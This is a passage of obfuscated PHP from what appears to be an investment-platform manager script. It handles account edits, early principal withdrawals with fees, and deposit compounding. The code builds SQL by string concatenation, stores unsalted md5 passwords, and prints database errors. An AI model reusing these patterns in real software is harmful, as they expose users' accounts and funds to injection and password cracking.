                                      $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $elnlcgcnET[$elnlcsyENS['elnlczWew']];
                                      $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $elnlcgcnET[$elnlcsyENS['elnlcmjdk']];
                                      $elnlcRuFoK[$elnlcsyENS['elnlctDSvC']] = $elnlcUAAU[$elnlcsyENS['elnlcnGMB']];
                                      elnlcsius ('account_update_confirmation', $elnlcgcnET[$elnlcsyENS['elnlcdktEr']], $elnlcSuVc[$elnlcsyENS['elnlcBpGlU']], $elnlcRuFoK);
                                      header ('Location: ?a=edit_account&action=confirm');
                                      elnlcnooln ($elnlcUazB);
                                      exit ();
                                    }
                                  }

                                  $elnlcMcrL = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcToEDy']]);
                                  $elnlckMaH = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcuNxa']]);
                                  $elnlcHkrC = md5 ($elnlckMaH);
                                  $elnlcLdIRt = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcdktEr']]);
                                  $elnlcBOsxh = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcJbVmx']]);
                                  $elnlcBjDz = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcDpTMB']]);
                                  $elnlcmcpNs = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcggahQ']]);
                                  $elnlcTGAb = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcyCqK']]);
                                  $elnlcFlEfv = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcpkmC']]);
                                  $elnlcpscev = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcAIMpf']]);
                                  if (($elnlcgcnET[$elnlcsyENS['elnlcdktEr']] != $elnlcWodOE[$elnlcsyENS['elnlcdktEr']] AND $elnlcSuVc[$elnlcsyENS['elnlcTrIn']] == 1))
                                  {
                                    $q = '' . 'update hm2_users set email = \'' . $elnlcLdIRt . '\' where id > 1 and id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                                    (mysql_query ($q) OR print mysql_error ());
                                  }

                                  if ($elnlcWodOE[$elnlcsyENS['elnlcuNxa']] != '')
                                  {
                                    $q = '' . 'update hm2_users set password = \'' . $elnlcHkrC . '\' where id > 1 and id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                                    (mysql_query ($q) OR print mysql_error ());
                                    if ($elnlcSuVc[$elnlcsyENS['elnlcaqCts']] == 1)
                                    {
                                      $elnlcRRFs = elnlcnczen ($elnlcWodOE[$elnlcsyENS['elnlcuNxa']]);
                                      $q = '' . 'update hm2_users set pswd = \'' . $elnlcRRFs . '\' where id > 1 and id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                                      (mysql_query ($q) OR print mysql_error ());
                                    }
                                  }

                                  if ($elnlcWodOE[$elnlcsyENS['elnlcAIMpf']] != '')
                                  {
                                    $q = '' . 'update hm2_users set transaction_code = \'' . $elnlcpscev . '\' where id > 1 and id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                                    (mysql_query ($q) OR print mysql_error ());
                                  }

                                  if ($elnlcWodOE[$elnlcsyENS['elnlcNRWtf']] != '')
                                  {
                                    $elnlcHkrC = elnlcnczen (md5 ($elnlcWodOE[$elnlcsyENS['elnlcNRWtf']]));
                                    $q = '' . 'update hm2_users set stat_password = \'' . $elnlcHkrC . '\' where id > 1 and id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                                    (mysql_query ($q) OR print mysql_error ());
                                  }

                                  $elnlcRJBv = '';
                                  if ($elnlcSuVc[$elnlcsyENS['elnlctckv']])
                                  {
                                    $elnlcRJBv = '' . 'address = \'' . $elnlcBOsxh . '\',
                          city = \'' . $elnlcBjDz . '\',
                          state = \'' . $elnlcmcpNs . '\',
                          zip = \'' . $elnlcTGAb . '\',
                          country = \'' . $elnlcFlEfv . '\',
                         ';
                                  }

                                  $elnlcgPjjO = '';
                                  if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcDxRe'])
                                  {
                                    $elnlcqrWmz = intval ($elnlcWodOE[$elnlcsyENS['elnlcuQjiT']]);
                                    if ($elnlcNkTSv[$elnlcqrWmz] == '')
                                    {
                                      $elnlcqrWmz = $elnlcsyENS['elnlctNxTK'];
                                    }

                                    $elnlcgPjjO = '' . ' lang = ' . $elnlcqrWmz . ', ';
                                  }

                                  $elnlcjpFA = unserialize ($elnlcgcnET[$elnlcsyENS['elnlcEoNu']]);
                                  foreach ($elnlcGPfS as $elnlcGxgf => $elnlcoFEhc)
                                  {
                                    if (!$elnlcSuVc[$elnlcsyENS['elnlcHrSi']])
                                    {
                                      continue;
                                    }

                                    if (($elnlcoFEhc[$elnlcsyENS['elnlcvWoa']] AND $elnlcoFEhc[$elnlcsyENS['elnlccotiB']]))
                                    {
                                      if (isset ($elnlcWodOE[$elnlcsyENS['elnlcWTtP']][$elnlcGxgf]))
                                      {
                                        if ($elnlcGxgf == 0)
                                        {
                                          $elnlcWodOE[$elnlcsyENS['elnlcWTtP']][$elnlcGxgf] = intval ($elnlcWodOE[$elnlcsyENS['elnlcWTtP']][$elnlcGxgf]);
                                        }

                                        $elnlcjpFA[$elnlcGxgf] = elnlcdvqmd ($elnlcWodOE[$elnlcsyENS['elnlcWTtP']][$elnlcGxgf]);
                                        continue;
                                      }

                                      continue;
                                    }
                                  }

                                  $elnlcOPfeJ = serialize ($elnlcjpFA);
                                  $elnlcjpFA = elnlcnczen ($elnlcOPfeJ);
                                  if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] != 'DQPVSQFDACRGGPT2GDZL')
                                  {
                                    $q = '' . 'update hm2_users set accounts = \'' . $elnlcjpFA . '\' where id > 1 and id =' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                                    (mysql_query ($q) OR print mysql_error ());
                                  }

                                  $elnlcdDNL = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcfLWC']]);
                                  $q = '' . 'update hm2_users set name = \'' . $elnlcMcrL . '\', 
                                 ' . $elnlcRJBv . '
                                 ' . $elnlcgPjjO . '
                                 user_auto_pay_earning = ' . $elnlcdDNL . '
            where id > 1 and id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                                  (mysql_query ($q) OR print mysql_error ());
                                  $q = 'select * from hm2_users where id =' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                                  $elnlchGkPU = mysql_query ($q);
                                  $elnlcgcnET = mysql_fetch_array ($elnlchGkPU);
                                  $elnlcgcnET[$elnlcsyENS['elnlcpicy']] = $elnlcsyENS['elnlctNxTK'];
                                  if ($elnlcSuVc[$elnlcsyENS['elnlckqcKo']] == 1)
                                  {
                                    $elnlcRuFoK = array ();
                                    $elnlcRuFoK[$elnlcsyENS['elnlczWew']] = $elnlcgcnET[$elnlcsyENS['elnlczWew']];
                                    $elnlcRuFoK[$elnlcsyENS['elnlcuNxa']] = $elnlckMaH;
                                    $elnlcRuFoK[$elnlcsyENS['elnlcmjdk']] = $elnlcgcnET[$elnlcsyENS['elnlcmjdk']];
                                    $elnlcRuFoK[$elnlcsyENS['elnlctDSvC']] = $elnlcUAAU[$elnlcsyENS['elnlcnGMB']];
                                    $elnlcRuFoK[$elnlcsyENS['elnlcbowGv']] = $elnlcgcnET[$elnlcsyENS['elnlcKMHsD']][0];
                                    $elnlcRuFoK[$elnlcsyENS['elnlcdktEr']] = $elnlcgcnET[$elnlcsyENS['elnlcdktEr']];
                                    if ($elnlcWodOE[$elnlcsyENS['elnlcdktEr']] == '')
                                    {
                                      $elnlcWodOE[$elnlcsyENS['elnlcdktEr']] = $elnlcgcnET[$elnlcsyENS['elnlcdktEr']];
                                    }

                                    elnlcsius ('change_account', $elnlcWodOE[$elnlcsyENS['elnlcdktEr']], $elnlcSuVc[$elnlcsyENS['elnlcuuOBt']], $elnlcRuFoK);
                                  }

                                  header ('Location: ?a=edit_account&say=changed');
                                  exit ();
                                }
                              }

                              $elnlchQTgj = array (array ('name' => 'United States'), array ('name' => 'Afghanistan'), array ('name' => 'Albania'), array ('name' => 'Algeria'), array ('name' => 'American Samoa'), array ('name' => 'Andorra'), array ('name' => 'Angola'), array ('name' => 'Anguilla'), array ('name' => 'Antarctica'), array ('name' => 'Antigua and Barbuda'), array ('name' => 'Argentina'), array ('name' => 'Armenia'), array ('name' => 'Aruba'), array ('name' => 'Australia'), array ('name' => 'Austria'), array ('name' => 'Azerbaidjan'), array ('name' => 'Bahamas'), array ('name' => 'Bahrain'), array ('name' => 'Bangladesh'), array ('name' => 'Barbados'), array ('name' => 'Belarus'), array ('name' => 'Belgium'), array ('name' => 'Belize'), array ('name' => 'Benin'), array ('name' => 'Bermuda'), array ('name' => 'Bhutan'), array ('name' => 'Bolivia'), array ('name' => 'Bosnia-Herzegovina'), array ('name' => 'Botswana'), array ('name' => 'Bouvet Island'), array ('name' => 'Brazil'), array ('name' => 'British Indian Ocean Territory'), array ('name' => 'Brunei Darussalam'), array ('name' => 'Bulgaria'), array ('name' => 'Burkina Faso'), array ('name' => 'Burundi'), array ('name' => 'Cambodia'), array ('name' => 'Cameroon'), array ('name' => 'Canada'), array ('name' => 'Cape Verde'), array ('name' => 'Cayman Islands'), array ('name' => 'Central African Republic'), array ('name' => 'Chad'), array ('name' => 'Chile'), array ('name' => 'China'), array ('name' => 'Christmas Island'), array ('name' => 'Cocos (Keeling) Islands'), array ('name' => 'Colombia'), array ('name' => 'Comoros'), array ('name' => 'Congo'), array ('name' => 'Congo (Democratic Republic)'), array ('name' => 'Cook Islands'), array ('name' => 'Costa Rica'), array ('name' => 'Croatia'), array ('name' => 'Cuba'), array ('name' => 'Cyprus'), array ('name' => 'Czech Republic'), array ('name' => 'Denmark'), array ('name' => 'Djibouti'), array ('name' => 'Dominica'), array ('name' => 'Dominican Republic'), array ('name' => 'East Timor'), array ('name' => 'Ecuador'), array ('name' => 'Egypt'), array ('name' => 'El Salvador'), array ('name' => 'Equatorial Guinea'), array ('name' => 'Eritrea'), array ('name' => 'Estonia'), array ('name' => 'Ethiopia'), array ('name' => 'Falkland Islands'), array ('name' => 'Faroe Islands'), array ('name' => 'Fiji'), array ('name' => 'Finland'), array ('name' => 'France'), array ('name' => 'France (European Territory)'), array ('name' => 'French Guiana'), array ('name' => 'French Southern Territories'), array ('name' => 'Gabon'), array ('name' => 'Gambia'), array ('name' => 'Georgia'), array ('name' => 'Germany'), array ('name' => 'Ghana'), array ('name' => 'Gibraltar'), array ('name' => 'Great Britain'), array ('name' => 'Greece'), array ('name' => 'Greenland'), array ('name' => 'Grenada'), array ('name' => 'Guadeloupe'), array ('name' => 'Guam'), array ('name' => 'Guatemala'), array ('name' => 'Guinea'), array ('name' => 'Guinea Bissau'), array ('name' => 'Guyana'), array ('name' => 'Haiti'), array ('name' => 'Heard and McDonald Islands'), array ('name' => 'Holy See (Vatican City State)'), array ('name' => 'Honduras'), array ('name' => 'Hong Kong'), array ('name' => 'Hungary'), array ('name' => 'Iceland'), array ('name' => 'India'), array ('name' => 'Indonesia'), array ('name' => 'Iran'), array ('name' => 'Iraq'), array ('name' => 'Ireland'), array ('name' => 'Israel'), array ('name' => 'Italy'), array ('name' => 'Ivory Coast (Cote D`Ivoire)'), array ('name' => 'Jamaica'), array ('name' => 'Japan'), array ('name' => 'Jordan'), array ('name' => 'Kazakhstan'), array ('name' => 'Kenya'), array ('name' => 'Kiribati'), array ('name' => 'Kuwait'), array ('name' => 'Kyrgyz Republic (Kyrgyzstan)'), array ('name' => 'Laos'), array ('name' => 'Latvia'), array ('name' => 'Lebanon'), array ('name' => 'Lesotho'), array ('name' => 'Liberia'), array ('name' => 'Libya'), array ('name' => 'Liechtenstein'), array ('name' => 'Lithuania'), array ('name' => 'Luxembourg'), array ('name' => 'Macau'), array ('name' => 'Macedonia'), array ('name' => 'Madagascar'), array ('name' => 'Malawi'), array ('name' => 'Malaysia'), array ('name' => 'Maldives'), array ('name' => 'Mali'), array ('name' => 'Malta'), array ('name' => 'Marshall Islands'), array ('name' => 'Martinique'), array ('name' => 'Mauritania'), array ('name' => 'Mauritius'), array ('name' => 'Mayotte'), array ('name' => 'Mexico'), array ('name' => 'Micronesia'), array ('name' => 'Moldavia'), array ('name' => 'Monaco'), array ('name' => 'Mongolia'), array ('name' => 'Montserrat'), array ('name' => 'Morocco'), array ('name' => 'Mozambique'), array ('name' => 'Myanmar'), array ('name' => 'Namibia'), array ('name' => 'Nauru'), array ('name' => 'Nepal'), array ('name' => 'Netherlands'), array ('name' => 'Netherlands Antilles'), array ('name' => 'New Caledonia'), array ('name' => 'New Zealand'), array ('name' => 'Nicaragua'), array ('name' => 'Niger'), array ('name' => 'Nigeria'), array ('name' => 'Niue'), array ('name' => 'Norfolk Island'), array ('name' => 'North Korea'), array ('name' => 'Northern Mariana Islands'), array ('name' => 'Norway'), array ('name' => 'Oman'), array ('name' => 'Pakistan'), array ('name' => 'Palau'), array ('name' => 'Panama'), array ('name' => 'Papua New Guinea'), array ('name' => 'Paraguay'), array ('name' => 'Peru'), array ('name' => 'Philippines'), array ('name' => 'Pitcairn Island'), array ('name' => 'Poland'), array ('name' => 'Polynesia'), array ('name' => 'Portugal'), array ('name' => 'Puerto Rico'), array ('name' => 'Qatar'), array ('name' => 'Reunion'), array ('name' => 'Romania'), array ('name' => 'Russian Federation'), array ('name' => 'Rwanda'), array ('name' => 'S. Georgia & S. Sandwich Isls.'), array ('name' => 'Saint Helena'), array ('name' => 'Saint Kitts & Nevis Anguilla'), array ('name' => 'Saint Lucia'), array ('name' => 'Saint Pierre and Miquelon'), array ('name' => 'Saint Vincent & Grenadines'), array ('name' => 'Samoa'), array ('name' => 'San Marino'), array ('name' => 'Sao Tome and Principe'), array ('name' => 'Saudi Arabia'), array ('name' => 'Senegal'), array ('name' => 'Seychelles'), array ('name' => 'Sierra Leone'), array ('name' => 'Singapore'), array ('name' => 'Slovak Republic'), array ('name' => 'Slovenia'), array ('name' => 'Solomon Islands'), array ('name' => 'Somalia'), array ('name' => 'South Africa'), array ('name' => 'South Korea'), array ('name' => 'Spain'), array ('name' => 'Sri Lanka'), array ('name' => 'Sudan'), array ('name' => 'Suriname'), array ('name' => 'Svalbard and Jan Mayen Islands'), array ('name' => 'Swaziland'), array ('name' => 'Sweden'), array ('name' => 'Switzerland'), array ('name' => 'Syria'), array ('name' => 'Taiwan'), array ('name' => 'Tajikistan'), array ('name' => 'Tanzania'), array ('name' => 'Thailand'), array ('name' => 'Togo'), array ('name' => 'Tokelau'), array ('name' => 'Tonga'), array ('name' => 'Trinidad and Tobago'), array ('name' => 'Tunisia'), array ('name' => 'Turkey'), array ('name' => 'Turkmenistan'), array ('name' => 'Turks and Caicos Islands'), array ('name' => 'Tuvalu'), array ('name' => 'USA Minor Outlying Islands'), array ('name' => 'Uganda'), array ('name' => 'Ukraine'), array ('name' => 'United Arab Emirates'), array ('name' => 'United Kingdom'), array ('name' => 'United States'), array ('name' => 'Uruguay'), array ('name' => 'Uzbekistan'), array ('name' => 'Vanuatu'), array ('name' => 'Venezuela'), array ('name' => 'Vietnam'), array ('name' => 'Virgin Islands (British)'), array ('name' => 'Virgin Islands (USA)'), array ('name' => 'Wallis and Futuna Islands'), array ('name' => 'Weather Stations'), array ('name' => 'Western Sahara'), array ('name' => 'Yemen'), array ('name' => 'Yugoslavia'), array ('name' => 'Zaire'), array ('name' => 'Zambia'), array ('name' => 'Zimbabwe'));
                              print base64_decode ('Cg==
');
                              $q = 'select date_format(\'' . $elnlcgcnET[$elnlcsyENS['elnlcefiL']] . '\' + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ' day, \'%b-%e-%Y %r\') as date_registered';
                              $elnlchGkPU = mysql_query ($q);
                              $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                              $elnlcgcnET[$elnlcsyENS['elnlcefiL']] = $elnlcCgqPK[$elnlcsyENS['elnlcmgBqO']];
                              $elnlcjpFA = unserialize ($elnlcgcnET[$elnlcsyENS['elnlcEoNu']]);
                              $elnlcacqs = array ();
                              foreach ($elnlcGPfS as $elnlckapu => $elnlcoFEhc)
                              {
                                if (($elnlcoFEhc[$elnlcsyENS['elnlccotiB']] == 1 AND $elnlcoFEhc[$elnlcsyENS['elnlcvWoa']] == 1))
                                {
                                  array_push ($elnlcacqs, array_merge (array ('id' => $elnlckapu, 'account' => $elnlcjpFA[$elnlckapu]), (array)$elnlcoFEhc));
                                  continue;
                                }
                              }

                              $elnlcfhFg->assign ('pay_accounts', $elnlcacqs);
                              $elnlcfhFg->assign ('userinfo', $elnlcgcnET);
                              $elnlcfhFg->assign ('errors', $elnlcjPews);
                              $elnlcfhFg->assign ('frm', $elnlcWodOE);
                              $elnlcfhFg->assign ('settings', $elnlcSuVc);
                              $elnlcfhFg->assign ('countries', $elnlchQTgj);
                              if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcDxRe'])
                              {
                                $elnlcQwWv = array ();
                                foreach ($elnlcNkTSv as $elnlckapu => $elnlciAbM)
                                {
                                  array_push ($elnlcQwWv, array ('id' => $elnlckapu, 'name' => $elnlciAbM));
                                }

                                $elnlcfhFg->assign ('langs', $elnlcQwWv);
                              }

                              $elnlcfhFg->display ($elnlcsyENS['elnlcrgPR']);
                              print base64_decode ('Cg==
');
                            }
                            else
                            {
                              if (($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcuklm'] AND $elnlcgcnET[$elnlcsyENS['elnlcpicy']] == 1))
                              {
                                if ($elnlcWodOE[$elnlcsyENS['elnlcNCOOK']])
                                {
                                  $elnlcfhFg->assign ('fatal', $elnlcsyENS['elnlcmKUuM']);
                                  $elnlcfhFg->display ($elnlcsyENS['elnlchqdMM']);
                                  exit ();
                                }

                                $elnlcOzjJ = $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                                $elnlcOMIk = intval ($elnlcWodOE[$elnlcsyENS['elnlcOBsC']]);
                                $q = '' . 'select 
               *,
               (to_days(now()) - to_days(deposit_date)) as deposit_duration
         from
               hm2_deposits
         where
               user_id = ' . $elnlcOzjJ . ' and
               id = ' . $elnlcOMIk . '
        ';
                                $elnlchGkPU = mysql_query ($q);
                                $elnlcNEHWg = mysql_fetch_array ($elnlchGkPU);
                                if (!$elnlcNEHWg)
                                {
                                  $elnlcfhFg->assign ('fatal', $elnlcsyENS['elnlcrtEN']);
                                  $elnlcfhFg->display ($elnlcsyENS['elnlchqdMM']);
                                  exit ();
                                }

                                $q = 'select * from hm2_types where id = ' . $elnlcNEHWg[$elnlcsyENS['elnlcPfzD']];
                                $elnlchGkPU = mysql_query ($q);
                                $elnlcgNwD = mysql_fetch_array ($elnlchGkPU);
                                if (!$elnlcgNwD[$elnlcsyENS['elnlcIUuj']])
                                {
                                  $elnlcfhFg->assign ('fatal', $elnlcsyENS['elnlcLJUAG']);
                                  $elnlcfhFg->display ($elnlcsyENS['elnlchqdMM']);
                                  exit ();
                                }

                                if ($elnlcNEHWg[$elnlcsyENS['elnlcpOrP']] < $elnlcgNwD[$elnlcsyENS['elnlcOhgyp']])
                                {
                                  $elnlcfhFg->assign ('fatal', $elnlcsyENS['elnlcQFynC']);
                                  $elnlcfhFg->display ($elnlcsyENS['elnlchqdMM']);
                                  exit ();
                                }

                                if (($elnlcgNwD[$elnlcsyENS['elnlclogQB']] <= $elnlcNEHWg[$elnlcsyENS['elnlcpOrP']] AND $elnlcgNwD[$elnlcsyENS['elnlclogQB']] != 0))
                                {
                                  $elnlcfhFg->assign ('fatal', $elnlcsyENS['elnlccuFMj']);
                                  $elnlcfhFg->display ($elnlcsyENS['elnlchqdMM']);
                                  exit ();
                                }

                                $elnlcNEHWg[$elnlcsyENS['elnlcOBsC']] = sprintf ('%.02f', floor ($elnlcNEHWg[$elnlcsyENS['elnlcAwVw']] * 100) / 100);
                                if (($elnlcSuVc[program_version] == $elnlcsyENS['elnlcNgInk'] AND $elnlcSuVc[license] == $elnlcsyENS['elnlcmxEbM']))
                                {
                                  $elnlcNEHWg[$elnlcsyENS['elnlcOBsC']] = sprintf ('%.02f', floor ($elnlcNEHWg[$elnlcsyENS['elnlcAwVw']] * 1000000) / 1000000);
                                }

                                if ($elnlcWodOE[$elnlcsyENS['elnlcevKUa']] == $elnlcsyENS['elnlcSsDzR'])
                                {
                                  $elnlcDfkn = sprintf ('%.02f', $elnlcWodOE[$elnlcsyENS['elnlcyteO']]);
                                  if ($elnlcNEHWg[$elnlcsyENS['elnlcAwVw']] < $elnlcDfkn)
                                  {
                                    $elnlcfhFg->assign ('deposit', $elnlcNEHWg);
                                    $elnlcfhFg->assign ('type', $elnlcgNwD);
                                    $elnlcfhFg->assign ('say', $elnlcsyENS['elnlcSazF']);
                                    $elnlcfhFg->display ($elnlcsyENS['elnlchqdMM']);
                                    exit ();
                                  }

                                  if ($elnlcDfkn <= 0)
                                  {
                                    $elnlcfhFg->assign ('deposit', $elnlcNEHWg);
                                    $elnlcfhFg->assign ('type', $elnlcgNwD);
                                    $elnlcfhFg->assign ('say', $elnlcsyENS['elnlcARBzD']);
                                    $elnlcfhFg->display ($elnlcsyENS['elnlchqdMM']);
                                    exit ();
                                  }

                                  $elnlcKtjJ = floor ($elnlcDfkn * $elnlcgNwD[$elnlcsyENS['elnlckTkCP']]) / 100;
                                  if ($elnlcKtjJ < 0.0100000000000000002081668)
                                  {
                                    $elnlcKtjJ = 0.0100000000000000002081668;
                                  }

                                  $elnlcevbl = $elnlcDfkn - $elnlcKtjJ;
                                  if ($elnlcevbl < 0)
                                  {
                                    $elnlcevbl = $elnlcsyENS['elnlcmjUx'];
                                  }

                                  $elnlcfhFg->assign ('deposit', $elnlcNEHWg);
                                  $elnlcfhFg->assign ('type', $elnlcgNwD);
                                  $elnlcfhFg->assign ('preview', 1);
                                  $elnlcfhFg->assign ('amount', $elnlcDfkn);
                                  $elnlcfhFg->assign ('fee', $elnlcKtjJ);
                                  $elnlcfhFg->assign ('to_balance', $elnlcevbl);
                                  $elnlcfhFg->display ($elnlcsyENS['elnlchqdMM']);
                                  exit ();
                                }

                                if ($elnlcWodOE[$elnlcsyENS['elnlcevKUa']] == $elnlcsyENS['elnlcUGHaR'])
                                {
                                  $elnlcDfkn = sprintf ('%.02f', $elnlcWodOE[$elnlcsyENS['elnlcyteO']]);
                                  if ($elnlcNEHWg[$elnlcsyENS['elnlcAwVw']] < $elnlcDfkn)
                                  {
                                    $elnlcfhFg->assign ('deposit', $elnlcNEHWg);
                                    $elnlcfhFg->assign ('type', $elnlcgNwD);
                                    $elnlcfhFg->assign ('say', $elnlcsyENS['elnlcSazF']);
                                    $elnlcfhFg->display ($elnlcsyENS['elnlchqdMM']);
                                    exit ();
                                  }

                                  if ($elnlcDfkn <= 0)
                                  {
                                    $elnlcfhFg->assign ('deposit', $elnlcNEHWg);
                                    $elnlcfhFg->assign ('type', $elnlcgNwD);
                                    $elnlcfhFg->assign ('say', $elnlcsyENS['elnlcARBzD']);
                                    $elnlcfhFg->display ($elnlcsyENS['elnlchqdMM']);
                                    exit ();
                                  }

                                  $elnlcKtjJ = floor ($elnlcDfkn * $elnlcgNwD[$elnlcsyENS['elnlckTkCP']]) / 100;
                                  if ($elnlcKtjJ < 0.0100000000000000002081668)
                                  {
                                    $elnlcKtjJ = 0.0100000000000000002081668;
                                  }

                                  $elnlcevbl = $elnlcDfkn - $elnlcKtjJ;
                                  if ($elnlcevbl < 0)
                                  {
                                    $elnlcevbl = $elnlcsyENS['elnlcmjUx'];
                                  }

                                  $elnlcppuUR = sprintf ('%.02f', $elnlcNEHWg[$elnlcsyENS['elnlcAwVw']]);
                                  if ($elnlcppuUR <= $elnlcDfkn)
                                  {
                                    $q = '' . 'update hm2_deposits set actual_amount = 0, amount = 0, status = \'off\' where user_id = ' . $elnlcOzjJ . ' and id = ' . $elnlcOMIk;
                                  }
                                  else
                                  {
                                    $q = '' . 'update hm2_deposits set actual_amount = actual_amount - ' . $elnlcDfkn . ', amount = amount - ' . $elnlcDfkn . ' where user_id = ' . $elnlcOzjJ . ' and id = ' . $elnlcOMIk;
                                  }

                                  mysql_query ($q);
                                  $q = '' . 'insert into hm2_history set
               user_id = ' . $elnlcOzjJ . ',
               amount = ' . $elnlcevbl . ',
               actual_amount = ' . $elnlcevbl . ',
               type = \'early_deposit_release\', 
               description = \'Pincipal withdraw ' . $elnlcDfkn . ' from $' . $elnlcNEHWg[$elnlcsyENS['elnlcOBsC']] . ' deposit from the ' . elnlcnczen ($elnlcgNwD[$elnlcsyENS['elnlcmjdk']]) . '\',
               date = now(),
               ec = ' . $elnlcNEHWg[$elnlcsyENS['elnlcyqyS']] . '
          ';
                                  mysql_query ($q);
                                  header ('Location: ?a=withdraw_principal&complete=1&deposit=' . $elnlcNEHWg[$elnlcsyENS['elnlcLbvLL']]);
                                  exit ();
                                }

                                $elnlcfhFg->assign ('deposit', $elnlcNEHWg);
                                $elnlcfhFg->assign ('type', $elnlcgNwD);
                                $elnlcfhFg->display ($elnlcsyENS['elnlchqdMM']);
                                print base64_decode ('Cg==
');
                              }
                              else
                              {
                                if (($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlckfVFF'] AND $elnlcgcnET[$elnlcsyENS['elnlcpicy']] == 1))
                                {
                                  if ($elnlcWodOE[$elnlcsyENS['elnlcNCOOK']])
                                  {
                                    $elnlcfhFg->assign ('fatal', $elnlcsyENS['elnlcGQTh']);
                                    $elnlcfhFg->display ($elnlcsyENS['elnlcbSJM']);
                                    exit ();
                                  }

                                  $elnlcOzjJ = $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                                  $elnlcOMIk = intval ($elnlcWodOE[$elnlcsyENS['elnlcOBsC']]);
                                  $q = '' . 'select 
               *,
               (to_days(now()) - to_days(deposit_date)) as deposit_duration
         from
               hm2_deposits
         where
               user_id = ' . $elnlcOzjJ . ' and
               id = ' . $elnlcOMIk . '
        ';
                                  $elnlchGkPU = mysql_query ($q);
                                  $elnlcNEHWg = mysql_fetch_array ($elnlchGkPU);
                                  if (!$elnlcNEHWg)
                                  {
                                    $elnlcfhFg->assign ('fatal', $elnlcsyENS['elnlcrtEN']);
                                    $elnlcfhFg->display ($elnlcsyENS['elnlcbSJM']);
                                    exit ();
                                  }

                                  $q = 'select * from hm2_types where id = ' . $elnlcNEHWg[$elnlcsyENS['elnlcPfzD']];
                                  $elnlchGkPU = mysql_query ($q);
                                  $elnlcgNwD = mysql_fetch_array ($elnlchGkPU);
                                  if (!$elnlcgNwD[$elnlcsyENS['elnlcvNkQ']])
                                  {
                                    $elnlcfhFg->assign ('fatal', $elnlcsyENS['elnlckbju']);
                                    $elnlcfhFg->display ($elnlcsyENS['elnlcbSJM']);
                                    exit ();
                                  }

                                  $elnlcrUqv = $elnlcNEHWg[$elnlcsyENS['elnlcAwVw']];
                                  if ($elnlcgNwD[$elnlcsyENS['elnlcdzAd']] == 0)
                                  {
                                    $elnlcgNwD[$elnlcsyENS['elnlcdzAd']] = $elnlcrUqv + 1;
                                  }

                                  if ($elnlcgNwD[$elnlcsyENS['elnlcDxJb']] == 1)
                                  {
                                    $elnlcnGUUn = preg_split ('/\\s*,\\s*/', $elnlcgNwD[$elnlcsyENS['elnlcDexfh']]);
                                    $elnlcdALE = array ();
                                    foreach ($elnlcnGUUn as $elnlcvRHDg)
                                    {
                                      array_push ($elnlcdALE, sprintf ('%d', $elnlcvRHDg));
                                    }

                                    sort ($elnlcdALE);
                                    $elnlcqsuFJ = array ();
                                    foreach ($elnlcdALE as $elnlcvRHDg)
                                    {
                                      array_push ($elnlcqsuFJ, array ('percent' => sprintf ('%d', $elnlcvRHDg)));
                                    }

                                    $elnlcfhFg->assign ('compound_percents', $elnlcqsuFJ);
                                  }
                                  else
                                  {
                                    $elnlcfhFg->assign ('compound_min_percents', $elnlcgNwD[$elnlcsyENS['elnlcORJuw']]);
                                    $elnlcfhFg->assign ('compound_max_percents', $elnlcgNwD[$elnlcsyENS['elnlcyDBs']]);
                                  }

                                  if ($elnlcWodOE[$elnlcsyENS['elnlcevKUa']] == $elnlcsyENS['elnlcODvc'])
                                  {
                                    $elnlcCUpJf = sprintf ('%.02f', $elnlcWodOE[$elnlcsyENS['elnlcOhvjC']]);
                                    if ($elnlcCUpJf < 0)
                                    {
                                      $elnlcCUpJf = $elnlcsyENS['elnlcmjUx'];
                                    }

                                    if (100 < $elnlcCUpJf)
                                    {
                                      $elnlcCUpJf = $elnlcsyENS['elnlcMknGz'];
                                    }

                                    if (($elnlcgNwD[$elnlcsyENS['elnlcqQISr']] <= $elnlcrUqv AND $elnlcrUqv <= $elnlcgNwD[$elnlcsyENS['elnlcdzAd']]))
                                    {
                                      if ($elnlcgNwD[$elnlcsyENS['elnlcDxJb']] == 1)
                                      {
                                        $elnlcnGUUn = preg_split ('/\\s*,\\s*/', $elnlcgNwD[$elnlcsyENS['elnlcDexfh']]);
                                        if (!in_array ($elnlcCUpJf, $elnlcnGUUn))
                                        {
                                          $elnlcCUpJf = $elnlcnGUUn[0];
                                        }
                                      }
                                      else
                                      {
                                        if ($elnlcCUpJf < $elnlcgNwD[$elnlcsyENS['elnlcORJuw']])
                                        {
                                          $elnlcCUpJf = $elnlcgNwD[$elnlcsyENS['elnlcORJuw']];
                                        }

                                        if ($elnlcgNwD[$elnlcsyENS['elnlcyDBs']] < $elnlcCUpJf)
                                        {
                                          $elnlcCUpJf = $elnlcgNwD[$elnlcsyENS['elnlcyDBs']];
                                        }
                                      }
                                    }
                                    else
                                    {
